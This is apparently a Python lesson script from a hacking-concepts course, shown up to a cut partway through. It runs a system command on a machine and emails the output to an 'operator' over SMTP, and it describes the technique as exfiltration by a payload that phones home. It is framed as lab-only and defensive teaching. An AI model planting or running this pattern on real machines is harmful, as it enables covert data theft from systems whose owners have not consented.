#!/usr/bin/env python3
"""
02 - execute_and_report payload
============================================================

WHAT IT DOES
    Runs a system command (like program 01) and then REPORTS the result
    back to the operator by email, instead of printing it to a screen
    nobody is watching. This is the classic pattern for a payload that
    runs on a machine you can't see: it does its job and phones home.

WHY IT MATTERS (hacking concept)
    "Exfiltration" = getting collected data off the target. Email is one
    of the oldest channels because almost every network allows outbound
    mail, and the data blends in with legitimate traffic. Understanding
    this is exactly what lets a defender spot it (see the takeaway).

PYTHON TOPICS TAUGHT
    - reusing a function from another module (execute_command)
    - smtplib + the email.message module to build and send mail
    - reading configuration (credentials) safely from the environment
    - structuring output into a readable report

LAB-ONLY. Use a THROWAWAY email account you created for testing, and
feed credentials via environment variables -- never hard-code real
passwords. See README.md.

    Setup (Gmail example, for your own test account):
      1. Enable 2FA on the throwaway account and create an "App Password".
      2. export REPORT_EMAIL="you_test@gmail.com"
         export REPORT_PASSWORD="the-app-password"
         export REPORT_TO="you_test@gmail.com"
"""

import os
import smtplib
import subprocess
from email.message import EmailMessage


def execute_command(command):
    """Same helper as program 01 -- run a command, return its output.

    In a larger project you'd `from execute_command import execute_command`.
    It's repeated here so each file runs standalone while you learn.
    """
    result = subprocess.run(command, capture_output=True, text=True)
    if result.returncode == 0:
        return result.stdout
    return result.stderr or f"(command exited with code {result.returncode})"


def send_report(subject, body):
    """Email `body` to the operator using SMTP over TLS.

    Credentials come from environment variables. Keeping secrets OUT of
    the source code is a habit worth building now -- hard-coded
    credentials are one of the most common real-world leaks, and a payload
    on disk with a password in it hands that password to anyone who finds
    the file.
    """
    sender = os.environ.get("REPORT_EMAIL")
    password = os.environ.get("REPORT_PASSWORD")
    recipient = os.environ.get("REPORT_TO", sender)

    if not sender or not password:
        raise RuntimeError(
            "Set REPORT_EMAIL and REPORT_PASSWORD in the environment first."
        )

    # EmailMessage builds a proper MIME message for us -- headers, body,
    # encoding -- instead of us h